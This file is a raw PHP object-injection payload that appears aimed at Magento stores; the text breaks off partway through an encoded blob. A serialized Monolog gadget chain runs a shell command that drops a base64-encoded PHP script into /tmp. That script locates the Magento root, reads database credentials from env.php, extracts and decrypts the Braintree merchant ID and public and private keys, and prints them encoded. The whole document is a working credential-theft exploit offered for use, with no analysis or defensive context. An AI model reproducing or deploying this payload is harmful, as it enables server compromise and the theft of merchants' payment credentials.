_|O:32:"Monolog\Handler\SyslogUdpHandler":1:{S:6:"socket";O:29:"Monolog\Handler\BufferHandler":7:{S:7:"handler";r:2;S:10:"bufferSize";i:-1;S:6:"buffer";a:1:{i:0;a:2:{i:0;S:16832:"M=$(pwd);T=/tmp/.x$$.php;echo PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApO0Bpbmlfc2V0KCdkaXNwbGF5X2Vycm9ycycsMCk7QGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsOTApOwpmdW5jdGlvbiBvdXQoJG0pe2VjaG8gcnRyaW0oc3RydHIoYmFzZTY0X2VuY29kZSgkbSksJysvJywnLV8nKSwnPScpO2V4aXQ7fQpmdW5jdGlvbiBpc01hZ2VudG8oJGRpcil7aWYoIUBpc19kaXIoIiRkaXIvYXBwIil8fCFAZmlsZV9leGlzdHMoIiRkaXIvYXBwL2V0Yy9lbnYucGhwIikpcmV0dXJuIGZhbHNlO3JldHVybiB0cnVlO30KZnVuY3Rpb24gY2FuU2hlbGwoKXtpZighZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykpcmV0dXJuIGZhbHNlOyR0ZXN0PUBzaGVsbF9leGVjKCdlY2hvIDEgMj4vZGV2L251bGwnKTtyZXR1cm4gJHRlc3QhPT1udWxsJiZ0cmltKCR0ZXN0KT09PScxJzt9Cgokcj1udWxsOwokY2FuU2hlbGxFeGVjPWNhblNoZWxsKCk7CgovLyBRdWljayBjaGVja3MKaWYoaXNzZXQoJF9TRVJWRVJbJ1BXRCddKSYmJF9TRVJWRVJbJ1BXRCddIT09Jy90bXAnJiYkX1NFUlZFUlsnUFdEJ10hPT0nLycpeyRjaGVjaz0kX1NFUlZFUlsnUFdEJ107aWYoYmFzZW5hbWUoJGNoZWNrKT09PSdwdWInKSRjaGVjaz1kaXJuYW1lKCRjaGVjayk7aWYoaXNNYWdlbnRvKCRjaGVjaykpJHI9JGNoZWNrO30KaWYoISRyKXskY3dkPWdldGN3ZCgpO2lmKCRjd2QhPT0nL3RtcCcmJiRjd2QhPT0nLycpeyRjaGVjaz0kY3dkO2lmKGJhc2VuYW1lKCRjaGVjayk9PT0ncHViJykkY2hlY2s9ZGlybmFtZSgkY2hlY2spO2lmKGlzTWFnZW50bygkY2hlY2spKSRyPSRjaGVjaztpZighJHIpeyRjdXJyZW50PSRjd2Q7Zm9yKCRpPTA7JGk8MTA7JGkrKyl7JHBhcmVudD1kaXJuYW1lKCRjdXJyZW50KTtpZigkcGFyZW50PT09JGN1cnJlbnR8fCRwYXJlbnQ9PT0nLycpYnJlYWs7aWYoaXNNYWdlbnRvKCRwYXJlbnQpKXskcj0kcGFyZW50O2JyZWFrO30kY3VycmVudD0kcGFyZW50O319fX0KaWYoISRyJiZpc3NldCgkX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddKSYmJF9TRVJWRVJbJ0RPQ1VNRU5UX1JPT1QnXSE9PScvJyl7JGNoZWNrPSRfU0VSVkVSWydET0NVTUVOVF9ST09UJ107aWYoYmFzZW5hbWUoJGNoZWNrKT09PSdwdWInKSRjaGVjaz1kaXJuYW1lKCRjaGVjayk7aWYoaXNNYWdlbnRvKCRjaGVjaykpJHI9JGNoZWNrO30KaWYoISRyJiZpc3NldCgkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ10pKXskcz1kaXJuYW1lKCRfU0VSVkVSWydTQ1JJUFRfRklMRU5BTUUnXSk7Zm9yKCRpPTA7JGk8MTA7JGkrKyl7aWYoaXNNYWdlbnRvKCRzKSl7JHI9JHM7YnJlYWs7fSRwYXJlbnQ9ZGlybmFtZSgkcyk7aWYoJHBhcmVudD09PSRzKWJyZWFrOyRzPSRwYXJlbnQ7fX0KCi8vIENvbW1vbiBwYXRocwppZighJHIpewogICAgZm9yZWFjaChbJy92YXIvd3d3L2h0bWwnLCcvdmFyL3d3dy9tYWdlbnRvJywnL3Zhci93d3cvbWFnZW50bzInLCcvdmFyL3d3dy9odG1sL21hZ2VudG8nLCcvdmFyL3d3dy9odG1sL21hZ2VudG8yJywnL3Vzci9zaGFyZS9uZ2lueC9odG1sJywnL3Vzci9zaGFyZS9uZ2lueC9odG1sL21hZ2VudG8nLCcvdXNyL2xvY2FsL2FwYWNoZTIvaHRkb2NzJywnL3Vzci9sb2NhbC93d3cnLCcvb3B0L21hZ2VudG8nLCcvb3B0L21hZ2VudG8yJywnL3Nydi93d3cnLCcvc3J2L3d3dy9odGRvY3MnLCcvc3J2L3d3dy9odG1sJywnL3Nydi9odHRwJ10gYXMgJHApewogICAgICAgIGlmKGlzTWFnZW50bygkcCkpeyRyPSRwO2JyZWFrO30KICAgIH0KfQoKLy8gUGxlc2sgdmhvc3RzCmlmKCEkciYmaXNfZGlyKCcvdmFyL3d3dy92aG9zdHMnKSl7CiAgICAkdmhvc3RzPUBnbG9iKCcvdmFyL3d3dy92aG9zdHMvKicsR0xPQl9PTkxZRElSKTsKICAgIGlmKCR2aG9zdHMpewogICAgICAgIGZvcmVhY2goJHZob3N0cyBhcyAkdmhvc3QpewogICAgICAgICAgICBmb3JlYWNoKFsnL2h0dHBkb2NzJywnL3B1YmxpY19odG1sJywnL3dlYicsJy9odG1sJywnJ10gYXMgJHN1ZmZpeCl7CiAgICAgICAgICAgICAgICAkYz0kdmhvc3QuJHN1ZmZpeDsKICAgICAgICAgICAgICAgIGlmKGlzTWFnZW50bygkYykpeyRyPSRjO2JyZWFrIDI7fQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgovLyBjUGFuZWwvc2hhcmVkIGhvc3RpbmcKaWYoISRyJiZpc19kaXIoJy9ob21lJykpewogICAgJGhvbWVzPUBnbG9iKCcvaG9tZS8qJyxHTE9CX09OTFlESVIpOwogICAgaWYoJGhvbWVzKXsKICAgICAgICBmb3JlYWNoKCRob21lcyBhcyAkaG9tZSl7CiAgICAgICAgICAgIGZvcmVhY2goWycvcHVibGljX2h0bWwnLCcvd3d3JywnL3dlYicsJy9odHRwZG9jcycsJy9wdWJsaWNfaHRtbC9tYWdlbnRvJywnL3B1YmxpY19odG1sL21hZ2VudG8yJ10gYXMgJHN1ZmZpeCl7CiAgICAgICAgICAgICAgICAkYz0kaG9tZS4kc3VmZml4OwogICAgICAgICAgICAgICAgaWYoaXNNYWdlbnRvKCRjKSl7JHI9JGM7YnJlYWsgMjt9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCi8vIERlZXAgcmVjdXJzaXZlIHNjYW4gZnJvbSBiYXNlIHJvb3RzIChkZXB0aCAxMikKaWYoISRyJiYkY2FuU2hlbGxFeGVjKXsKICAgICRiYXNlUm9vdHM9WycvdmFyL3d3dycsJy9zcnYvd3d3JywnL3Nydi9odHRwJywnL29wdCcsJy91c3Ivc2hhcmUvbmdpbngnLCcvZGF0YScsJy9tbnQnLCcvJ107CiAgICBmb3JlYWNoKCRiYXNlUm9vdHMgYXMgJGJhc2UpewogICAgICAgIGlmKCFpc19kaXIoJGJhc2UpKWNvbnRpbnVlOwogICAgICAgICRmaW5kQ21kPSJ0aW1lb3V0IDQ1IGZpbmQgIi5lc2NhcGVzaGVsbGFyZygkYmFzZSkuIiAtbWF4ZGVwdGggMTIgLXR5cGUgZiAtbmFtZSAnZW52LnBocCcgLXBhdGggJyovYXBwL2V0Yy9lbnYucGhwJyAhIC1wYXRoICcqL3ZlbmRvci8qJyAhIC1wYXRoICcqL25vZGVfbW9kdWxlcy8qJyAhIC1wYXRoICcqLy5naXQvKicgISAtcGF0aCAnKi9jYWNoZS8qJyAhIC1wYXRoICcqL3RtcC8qJyAhIC1wYXRoICcqL2xvZy8qJyAyPi9kZXYvbnVsbCB8IGhlYWQgLW4gNSI7CiAgICAgICAgJGZpbGVzPUBzaGVsbF9leGVjKCRmaW5kQ21kKTsKICAgICAgICBpZigkZmlsZXMpewogICAgICAgICAgICAkZmlsZXM9YXJyYXlfZmlsdGVyKGV4cGxvZGUoIlxuIix0cmltKCRmaWxlcykpKTsKICAgICAgICAgICAgZm9yZWFjaCgkZmlsZXMgYXMgJGZpbGUpewogICAgICAgICAgICAgICAgJHBvdGVudGlhbFJvb3Q9ZGlybmFtZShkaXJuYW1lKGRpcm5hbWUoJGZpbGUpKSk7CiAgICAgICAgICAgICAgICBpZihpc01hZ2VudG8oJHBvdGVudGlhbFJvb3QpKXskcj1yZWFscGF0aCgkcG90ZW50aWFsUm9vdCk7YnJlYWsgMjt9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCi8vIGxvY2F0ZSBjb21tYW5kIChmYXN0KQppZighJHImJiRjYW5TaGVsbEV4ZWMpewogICAgJGxvY2F0ZT1Ac2hlbGxfZXhlYygibG9jYXRlIC1sIDUwICdhcHAvZXRjL2Vudi5waHAnIDI+L2Rldi9udWxsIik7CiAgICBpZigkbG9jYXRlKXsKICAgICAgICAkZmlsZXM9YXJyYXlfZmlsdGVyKGV4cGxvZGUoIlxuIix0cmltKCRsb2NhdGUpKSk7CiAgICAgICAgZm9yZWFjaCgkZmlsZXMgYXMgJGZpbGUpewogICAgICAgICAgICBpZihzdHJwb3MoJGZpbGUsJ2FwcC9ldGMvZW52LnBocCcpIT09ZmFsc2UpewogICAgICAgICAgICAgICAgJHBvdGVudGlhbFJvb3Q9ZGlybmFtZShkaXJuYW1lKGRpcm5hbWUoJGZpbGUpKSk7CiAgICAgICAgICAgICAgICBpZihpc01hZ2VudG8oJHBvdGVudGlhbFJvb3QpKXskcj0kcG90ZW50aWFsUm9vdDticmVhazt9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0KCi8vIFByb2Nlc3MgaW5zcGVjdGlvbgppZighJHImJiRjYW5TaGVsbEV4ZWMpewogICAgJHBzQ21kPSJwcyBhdXggMj4vZGV2L251bGwgfCBncmVwIC1FICcocGhwLWZwbXxodHRwZHxhcGFjaGV8bmdpbngpJyB8IGdyZXAgLW9FICcvW14gXSsnIHwgZ3JlcCAtRSAnKG1hZ2VudG98cHVibGljX2h0bWx8aHR0cGRvY3N8d3d3KScgMj4vZGV2L251bGwgfCBoZWFkIC1uIDUwIjsKICAgICRwYXRocz1Ac2hlbGxfZXhlYygkcHNDbWQpOwogICAgaWYoJHBhdGhzKXsKICAgICAgICAkcGF0aHM9YXJyYXlfZmlsdGVyKGFycmF5X3VuaXF1ZShleHBsb2RlKCJcbiIsdHJpbSgkcGF0aHMpKSkpOwogICAgICAgIGZvcmVhY2goJHBhdGhzIGFzICRwYXRoKXsKICAgICAgICAgICAgZm9yKCRqPTA7JGo8ODskaisrKXsKICAgICAgICAgICAgICAgIGlmKGlzTWFnZW50bygkcGF0aCkpeyRyPXJlYWxwYXRoKCRwYXRoKTticmVhayAyO30KICAgICAgICAgICAgICAgICRwYXJlbnQ9ZGlybmFtZSgkcGF0aCk7CiAgICAgICAgICAgICAgICBpZigkcGFyZW50PT09JHBhdGgpYnJlYWs7CiAgICAgICAgICAgICAgICAkcGF0aD0kcGFyZW50OwogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9CgovLyBQSFAgZmFsbGJhY2sgaWYgc2hlbGxfZXhlYyBkaXNhYmxlZAppZighJHImJiEkY2FuU2hlbGxFeGVjKXsKICAgICRzdGFydD1taWNyb3RpbWUodHJ1ZSk7CiAgICB0cnl7CiAgICAgICAgJGl0ZXJhdG9yPW5ldyBSZWN1cnNpdmVJdGVyYXRvckl0ZXJhdG9yKG5ldyBSZWN1cnNpdmVEaXJlY3RvcnlJdGVyYXRvcignLycsRmlsZXN5c3RlbUl0ZXJhdG9yOjpTS0lQX0RPVFMpLFJlY3Vyc2l2ZUl0ZXJhdG9ySXRlcmF0b3I6OlNFTEZfRklSU1QpOwogICAgICAgICRpdGVyYXRvci0+c2V0TWF4RGVwdGgoMTIpOwogICAgICAgIGZvcmVhY2goJGl0ZXJhdG9yIGFzICRmaWxlKXsKICAgICAgICAgICAgaWYoKG1pY3JvdGltZSh0cnVlKS0kc3RhcnQpPjQ1KWJyZWFrOwogICAgICAgICAgICBpZighJGZpbGUtPmlzRmlsZSgpfHwkZmlsZS0+Z2V0RmlsZW5hbWUoKSE9PSdlbnYucGhwJyljb250aW51ZTsKICAgICAgICAgICAgJHBhdGg9c3RyX3JlcGxhY2UoJ1xcJywnLycsJGZpbGUtPmdldFBhdGhuYW1lKCkpOwogICAgICAgICAgICBpZihzdHJwb3MoJHBhdGgsJy9hcHAvZXRjL2Vudi5waHAnKT09PWZhbHNlKWNvbnRpbnVlOwogICAgICAgICAgICAkcG90ZW50aWFsUm9vdD1kaXJuYW1lKGRpcm5hbWUoZGlybmFtZSgkcGF0aCkpKTsKICAgICAgICAgICAgaWYoaXNNYWdlbnRvKCRwb3RlbnRpYWxSb290KSl7JHI9JHBvdGVudGlhbFJvb3Q7YnJlYWs7fQogICAgICAgIH0KICAgIH1jYXRjaChFeGNlcHRpb24gJGUpe30KfQoKaWYoISRyfHwkcj09PScvJylvdXQoIkVSUjpOT19FTlYiKTsKaWYoQGZpbGVfZXhpc3RzKCIkci9hcHAvZXRjL2xvY2FsLnhtbCIpJiYhQGZpbGVfZXhpc3RzKCIkci9hcHAvZXRjL2Vudi5waHAiKSlvdXQoIkVSUjpNQUdFTlRPMSIpOwppZighQGZpbGVfZXhpc3RzKCIkci9hcHAvZXRjL2Vudi5waHAiKSlvdXQoIkVSUjpOT19FTlYiKTsKaWYoIUBpc19yZWFkYWJsZSgiJHIvYXBwL2V0Yy9lbnYucGhwIikpb3V0KCJFUlI6RU5WX1BFUk0iKTsKCkBjaGRpcigkcik7JGM9QGluY2x1ZGUoImFwcC9ldGMvZW52LnBocCIpOwppZighaXNfYXJyYXkoJGMpKW91dCgiRVJSOkVOVl9QQVJTRSIpOwppZighaXNzZXQoJGNbJ2RiJ11bJ2Nvbm5lY3Rpb24nXVsnZGVmYXVsdCddKSlvdXQoIkVSUjpOT19EQiIpOwokZD0kY1snZGInXVsnY29ubmVjdGlvbiddWydkZWZhdWx0J107Cgp0cnl7CiAgICAkZHNuPSJteXNxbDpob3N0PXskZFsnaG9zdCddfTtkYm5hbWU9eyRkWydkYm5hbWUnXX0iOwogICAgaWYoaXNzZXQoJGRbJ3BvcnQnXSkpJGRzbi49Ijtwb3J0PXskZFsncG9ydCddfSI7CiAgICAkcGRvPW5ldyBQRE8oJGRzbiwkZFsndXNlcm5hbWUnXSwkZFsncGFzc3dvcmQnXSxbUERPOjpBVFRSX0VSUk1PREU9PlBETzo6RVJSTU9ERV9FWENFUFRJT04sUERPOjpBVFRSX1RJTUVPVVQ9PjEwXSk7Cn1jYXRjaChFeGNlcHRpb24gJGUpe291dCgiRVJSOkRCIik7fQoKLy8gREVCVUc6IENoZWNrIHdoYXQgQnJhaW50cmVlLXJlbGF0ZWQgcGF0aHMgZXhpc3QKJGRlYnVnUT0kcGRvLT5xdWVyeSgiU0VMRUNUIHBhdGgsdmFsdWUgRlJPTSBjb3JlX2NvbmZpZ19kYXRhIFdIRVJFIHBhdGggTElLRSAnJWJyYWludHJlZSUnIE9SREVSIEJZIHBhdGggTElNSVQgNTAiKTsKJGRlYnVnUm93cz0kZGVidWdRLT5mZXRjaEFsbChQRE86OkZFVENIX0FTU09DKTsKJGRlYnVnSW5mbz0iUk9XUzoiLmNvdW50KCRkZWJ1Z1Jvd3MpOwppZihjb3VudCgkZGVidWdSb3dzKT4wKXsKICAgICRkZWJ1Z0luZm8uPSJ8UEFUSFM6Ii5pbXBsb2RlKCcsJyxhcnJheV9tYXAoZnVuY3Rpb24oJHIpe3JldHVybiBzdWJzdHIoJHJbJ3BhdGgnXSwtMzUpO30sJGRlYnVnUm93cykpOwp9CgokcT0kcGRvLT5xdWVyeSgiU0VMRUNUIHBhdGgsdmFsdWUgRlJPTSBjb3JlX2NvbmZpZ19kYXRhIFdIRVJFIHBhdGggTElLRSAnJWJyYWludHJlZSUnIEFORCAocGF0aCBMSUtFICclbWVyY2hhbnRfaWQnIE9SIHBhdGggTElLRSAnJXB1YmxpY19rZXknIE9SIHBhdGggTElLRSAnJXByaXZhdGVfa2V5JykgT1JERVIgQlkgQ0FTRSBzY29wZSBXSEVOICdkZWZhdWx0JyBUSEVOIDAgV0hFTiAnd2Vic2l0ZXMnIFRIRU4gMSBXSEVOICdzdG9yZXMnIFRIRU4gMiBFTkQsc2NvcGVfaWQgQVNDIExJTUlUIDQwIik7CiRyb3dzPSRxLT5mZXRjaEFsbChQRE86OkZFVENIX0FTU09DKTsKCmlmKCEkcm93cyl7CiAgICAkY2hlY2tRPSRwZG8tPnF1ZXJ5KCJTRUxFQ1QgcGF0aCBGUk9NIGNvcmVfY29uZmlnX2RhdGEgV0hFUkUgcGF0aCBMSUtFICdwYXltZW50L2JyYWludHJlZSUnIExJTUlUIDUiKTsKICAgICRhbnlCdD0kY2hlY2tRLT5mZXRjaEFsbChQRE86OkZFVENIX0FTU09DKTsKICAgIGlmKCRhbnlCdCYmY291bnQoJGFueUJ0KT4wKW91dCgiRVJSOk5PX0tFWVN8Ii4kZGVidWdJbmZvKTsKICAgIG91dCgiRVJSOk5PX0JUfCIuJGRlYnVnSW5mbyk7Cn0KCiRyb3dDb3VudD1jb3VudCgkcm93cyk7CiRsaXZlPVsnbWVyY2hhbnRfaWQnPT4nJywncHVibGljX2tleSc9PicnLCdwcml2YXRlX2tleSc9PicnXTsKJHNhbmRib3g9WydtZXJjaGFudF9pZCc9PicnLCdwdWJsaWNfa2V5Jz0+JycsJ3ByaXZhdGVfa2V5Jz0+JyddOwokZW5jcnlwdGVkRm91bmQ9W107CgpmdW5jdGlvbiBkZWMoJHYsJGtleVN0cmluZyl7CiAgICBpZighcHJlZ19tYXRjaCgnL14oXGQrKTooXGQrKTooLispJC8nLCR2LCRtKSlyZXR1cm4gJHY7CiAgICBsaXN0KCwka2V5VmVyc2lvbiwkY2lwaGVyVmVyc2lvbiwkZW5jRGF0YSk9JG07CiAgICAkZGVjb2RlZD1iYXNlNjRfZGVjb2RlKCRlbmNEYXRhKTsKICAgIGlmKCEkZGVjb2RlZClyZXR1cm4gJyc7CiAgICAka2V5cz1hcnJheV9maWx0ZXIocHJlZ19zcGxpdCgnL1xzKy8nLCRrZXlTdHJpbmcpKTsKICAgIGlmKGVtcHR5KCRrZXlzKSlyZXR1cm4gJyc7CiAgICAka2V5SW5kZXg9KGludCkka2V5VmVyc2lvbjsKICAgIGlmKCRrZXlJbmRleD49Y291bnQoJGtleXMpKSRrZXlJbmRleD1jb3VudCgka2V5cyktMTsKICAgICRrZXk9JGtleXNbJGtleUluZGV4XTsKICAgICRjaXBoZXJNYXA9WzA9PlsnYWxnbyc9PidiZi1lY2InLCdrZXlMZW4nPT5udWxsLCdpdkxlbic9PjBdLDE9PlsnYWxnbyc9PidhZXMtMTI4LWNiYycsJ2tleUxlbic9PjE2LCdpdkxlbic9PjE2XSwyPT5bJ2FsZ28nPT4nYWVzLTI1Ni1lY2InLCdrZXlMZW4nPT4zMiwnaXZMZW4nPT4wXSwzPT5bJ2FsZ28nPT4nYWVzLTI1Ni1jYmMnLCdrZXlMZW4nPT4zMiwnaXZMZW4nPT4xNl1dOwogICAgJGNpcGhlcj1pc3NldCgkY2lwaGVyTWFwWyRjaXBoZXJWZXJzaW9uXSk/JGNpcGhlck1hcFskY2lwaGVyVmVyc2lvbl06JGNpcGhlck1hcFszXTsKICAgIAogICAgLy8gRXh0cmFjdCBJViBmb3IgQ0JDIG1vZGVzCiAgICAkaXY9bnVsbDsKICAgICRjaXBoZXJ0ZXh0PSRkZWNvZGVkOwogICAgaWYoJGNpcGhlclsnaXZMZW4nXT4wJiZzdHJsZW4oJGRlY29kZWQpPiRjaXBoZXJbJ2l2TGVuJ10pewogICAgICAgICRpdj1zdWJzdHIoJGRlY29kZWQsMCwkY2lwaGVyWydpdkxlbiddKTsKICAgICAgICAkY2lwaGVydGV4dD1zdWJzdHIoJGRlY29kZWQsJGNpcGhlclsnaXZMZW4nXSk7CiAgICB9CiAgICAKICAgICRtZXRob2RzPVtbJ2tleSc9PiRrZXksJ3ByZXAnPT4ncmF3J10sWydrZXknPT5tZDUoJGtleSksJ3ByZXAnPT4nbWQ1J10sWydrZXknPT4ka2V5LCdwcmVwJz0+J3BhZGRlZCddLFsna2V5Jz0+aGFzaCgnc2hhMjU2Jywka2V5LHRydWUpLCdwcmVwJz0+J3NoYTI1NiddXTsKICAgIGZvcmVhY2goJG1ldGhvZHMgYXMgJG1ldGhvZCl7CiAgICAgICAgJGVuY0tleT0kbWV0aG9kWydrZXknXTsKICAgICAgICBpZigkY2lwaGVyWydrZXlMZW4nXSl7CiAgICAgICAgICAgIGlmKCRtZXRob2RbJ3ByZXAnXT09PSdwYWRkZWQnfHxzdHJsZW4oJGVuY0tleSk8JGNpcGhlclsna2V5TGVuJ10pewogICAgICAgICAgICAgICAgJGVuY0tleT1zdHJfcGFkKCRlbmNLZXksJGNpcGhlclsna2V5TGVuJ10sIlwwIik7CiAgICAgICAgICAgICAgICAkZW5jS2V5PXN1YnN0cigkZW5jS2V5LDAsJGNpcGhlclsna2V5TGVuJ10pOwogICAgICAgICAgICB9ZWxzZSBpZihzdHJsZW4oJGVuY0tleSk+JGNpcGhlclsna2V5TGVuJ10pJGVuY0tleT1zdWJzdHIoJGVuY0tleSwwLCRjaXBoZXJbJ2tleUxlbiddKTsKICAgICAgICB9CiAgICAgICAgJHJlc3VsdD0kaXYhPT1udWxsP0BvcGVuc3NsX2RlY3J5cHQoJGNpcGhlcnRleHQsJGNpcGhlclsnYWxnbyddLCRlbmNLZXksT1BFTlNTTF9SQVdfREFUQSwkaXYpOkBvcGVuc3NsX2RlY3J5cHQoJGNpcGhlcnRleHQsJGNpcGhlclsnYWxnbyddLCRlbmNLZXksT1BFTlNTTF9SQVdfREFUQSk7CiAgICAgICAgaWYoJHJlc3VsdCE9PWZhbHNlJiYkcmVzdWx0IT09JycpewogICAgICAgICAgICAkY2xlYW5lZD1ydHJpbSgkcmVzdWx0LCJcMFx4MDRceDAzXHgwMlx4MDFceDA1XHgwNlx4MDdceDA4XHgwOVx4MGFceDBiXHgwY1x4MGRceDBlXHgwZlx4MTAiKTsKICAgICAgICAgICAgaWYoJGNsZWFuZWQhPT0nJyYmY3R5cGVfcHJpbnQoc3RyX3JlcGxhY2UoWyJcciIsIlxuIiwiXHQiXSwnJywkY2xlYW5lZCkpKXJldHVybiAkY2xlYW5lZDsKICAgICAgICB9CiAgICB9CiAgICByZXR1cm4gJyc7Cn0KCiRlbmNLZXk9aXNzZXQoJGNbJ2NyeXB0J11bJ2tleSddKT8kY1snY3J5cHQnXVsna2V5J106Jyc7CmlmKHN1YnN0cigkZW5jS2V5LDAsNik9PT0nYmFzZTY0JykkZW5jS2V5PWJhc2U2NF9kZWNvZGUoc3Vic3RyKCRlbmNLZXksNikpOwoKLy8gVHJ5IHVzaW5nIE1hZ2VudG8ncyBuYXRpdmUgZGVjcnlwdGlvbiBmaXJzdAokbWFnZW50b0VuY3J5cHRvcj1udWxsOwppZihAZmlsZV9leGlzdHMoIiRyL2FwcC9ib290c3RyYXAucGhwIikpewogICAgQHNldF90aW1lX2xpbWl0KDYwKTsKICAgIHRyeXsKICAgICAgICBAcmVxdWlyZV9vbmNlICIkci9hcHAvYm9vdHN0cmFwLnBocCI7CiAgICAgICAgaWYoY2xhc3NfZXhpc3RzKCdcTWFnZW50b1xGcmFtZXdvcmtcQXBwXEJvb3RzdHJhcCcpKXsKICAgICAgICAgICAgJGJvb3RzdHJhcD1cTWFnZW50b1xGcmFtZXdvcmtcQXBwXEJvb3RzdHJhcDo6Y3JlYXRlKEJQLCRfU0VSVkVSKTsKICAgICAgICAgICAgJG1hZ2VudG9FbmNyeXB0b3I9JGJvb3RzdHJhcC0+Z2V0T2JqZWN0TWFuYWdlcigpLT5nZXQoJ1xNYWdlbnRvXEZyYW1ld29ya1xFbmNyeXB0aW9uXEVuY3J5cHRvckludGVyZmFjZScpOwogICAgICAgIH0KICAgIH1jYXRjaChFeGNlcHRpb24gJGUpe30KfQoKZm9yZWFjaCgkcm93cyBhcyAkcm93KXsKICAgICRwYXRoPSRyb3dbJ3BhdGgnXTsKICAgICR2YWw9JHJvd1sndmFsdWUnXTsKICAgIAogICAgLy8gRGV0ZXJtaW5lIGlmIHNhbmRib3ggb3IgbGl2ZQogICAgJGlzU2FuZGJveD1zdHJpcG9zKCRwYXRoLCdzYW5kYm94JykhPT1mYWxzZTsKICAgIAogICAgLy8gRGV0ZXJtaW5lIHdoaWNoIGtleSB0eXBlCiAgICAka2V5VHlwZT0nJzsKICAgIGlmKHN0cmlwb3MoJHBhdGgsJ21lcmNoYW50X2lkJykhPT1mYWxzZSkka2V5VHlwZT0nbWVyY2hhbnRfaWQnOwogICAgZWxzZWlmKHN0cmlwb3MoJHBhdGgsJ3B1YmxpY19rZXknKSE9PWZhbHNlKSRrZXlUeXBlPSdwdWJsaWNfa2V5JzsKICAgIGVsc2VpZihzdHJpcG9zKCRwYXRoLCdwcml2YXRlX2tleScpIT09ZmFsc2UpJGtleVR5cGU9J3ByaXZhdGVfa2V5JzsKICAgIAogICAgaWYoISRrZXlUeXBlKWNvbnRpbnVlOwogICAgCiAgICAvLyBUcmFjayBlbXB0eSB2YWx1ZXMKICAgIGlmKGVtcHR5KCR2YWwpKXsKICAgICAgICBjb250aW51ZTsKICAgIH0KICAgIAogICAgLy8gQ2hlY2sgaWYgZW5jcnlwdGVkCiAgICAkaXNFbmNyeXB0ZWQ9cHJlZ19tYXRjaCgnL15cZCs6XGQrOi8nLCR2YWwpOwogICAgCiAgICAvLyBTa2lwIGlmIHdlIGFscmVhZHkgaGF2ZSB0aGlzIGtleSBmb3IgdGhpcyBlbnZpcm9ubWVudAogICAgaWYoJGlzU2FuZGJveCYmIWVtcHR5KCRzYW5kYm94WyRrZXlUeXBlXSkpY29udGludWU7CiAgICBpZighJGlzU2FuZGJveCYmIWVtcHR5KCRsaXZlWyRrZXlUeXBlXSkpY29udGludWU7CiAgICAKICAgIC8vIERlY3J5cHQgaWYgbmVlZGVkCiAgICBpZihwcmVnX21hdGNoKCcvXlxkKzpcZCs6LycsJHZhbCkpewogICAgICAgICRkZWNyeXB0ZWQ9Jyc7CiAgICAgICAgCiAgICAgICAgLy8gVHJ5IE1hZ2VudG8ncyBuYXRpdmUgZGVjcnlwdG9yIGZpcnN0IChoYW5kbGVzIENoYUNoYTIwIGV0Yy4pCiAgICAgICAgaWYoJG1hZ2VudG9FbmNyeXB0b3IpewogICAgICAgICAgICB0cnl7CiAgICAgICAgICAgICAgICAkZGVjcnlwdGVkPSRtYWdlbnRvRW5jcnlwdG9yLT5kZWNyeXB0KCR2YWwpOwogICAgICAgICAgICB9Y2F0Y2goRXhjZXB0aW9uICRlKXt9CiAgICAgICAgfQogICAgICAgIAogICAgICAgIC8vIEZhbGxiYWNrIHRvIG1hbnVhbCBkZWNyeXB0aW9uIGZvciBvbGRlciBjaXBoZXJzCiAgICAgICAgaWYoZW1wdHkoJGRlY3J5cHRlZCkpewogICAgICAgICAgICAkZGVjcnlwdGVkPWRlYygkdmFsLCRlbmNLZXkpOwogICAgICAgIH0KICAgICAgICAKICAgICAgICBpZighZW1wdHkoJGRlY3J5cHRlZCkpewogICAgICAgICAgICAvLyBTa2lwICJ0ZXN0bW9kZSIgdmFsdWVzIC0gdGhleSdyZSBub3QgcmVhbCBjcmVkZW50aWFscwogICAgICAgICAgICBpZigka2V5VHlwZT09PSdtZXJjaGFudF9pZCcmJnN0cnRvbG93ZXIoJGRlY3J5cHRlZCk9PT0ndGVzdG1vZGUnKXsKICAgICAgICAgICAgICAgIC8vIFNraXAgdGVzdG1vZGUKICAgICAgICAgICAgfWVsc2V7CiAgICAgICAgICAgICAgICBpZigkaXNTYW5kYm94KSRzYW5kYm94WyRrZXlUeXBlXT0kZGVjcnlwdGVkOwogICAgICAgICAgICAgICAgZWxzZSAkbGl2ZVska2V5VHlwZV09JGRlY3J5cHRlZDsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH1lbHNlewogICAgICAgIC8vIFBsYWludGV4dCB2YWx1ZQogICAgICAgIGlmKCRrZXlUeXBlPT09J21lcmNoYW50X2lkJyYmc3RydG9sb3dlcigkdmFsKT09PSd0ZXN0bW9kZScpewogICAgICAgICAgICAvLyBTa2lwIHRlc3Rtb2RlCiAgICAgICAgfWVsc2V7CiAgICAgICAgICAgIGlmKCRpc1NhbmRib3gpJHNhbmRib3hbJGtleVR5cGVdPSR2YWw7CiAgICAgICAgICAgIGVsc2UgJGxpdmVbJGtleVR5cGVdPSR2YWw7CiAgICAgICAgfQogICAgfQp9CgovLyBDaGVjayBpZiB3ZSBoYXZlIGNvbXBsZXRlIGNyZWRlbnRpYWxzCiRoYXNMaXZlPSFlbXB0eSgkbGl2ZVsnbWVyY2hhbnRfaWQnXSkmJiFlbXB0eSgkbGl2ZVsncHVibGljX2tleSddKSYmIWVtcHR5KCRsaXZlWydwcml2YXRlX2tleSddKTsKJGhhc1NhbmRib3g9IWVtcHR5KCRzYW5kYm94WydtZXJjaGFudF9pZCddKSYmIWVtcHR5KCRzYW5kYm94WydwdWJsaWNfa2V5J10pJiYhZW1wdHkoJHNhbmRib3hbJ3ByaXZhdGVfa2V5J10pOwoKaWYoISRoYXNMaXZlJiYhJGhhc1NhbmRib3gpewogICAgJG1pc3Npbmc9W107CiAgICBpZihlbXB0eSgkbGl2ZVsnbWVyY2hhbnRfaWQnXSkmJmVtcHR5KCRzYW5kYm94WydtZXJjaGFudF9pZCddKSkkbWlzc2luZ1tdPSdNJzsKICAgIGlmKGVtcHR5KCRsaXZlWydwdWJsaWNfa2V5J10pJiZlbXB0eSgkc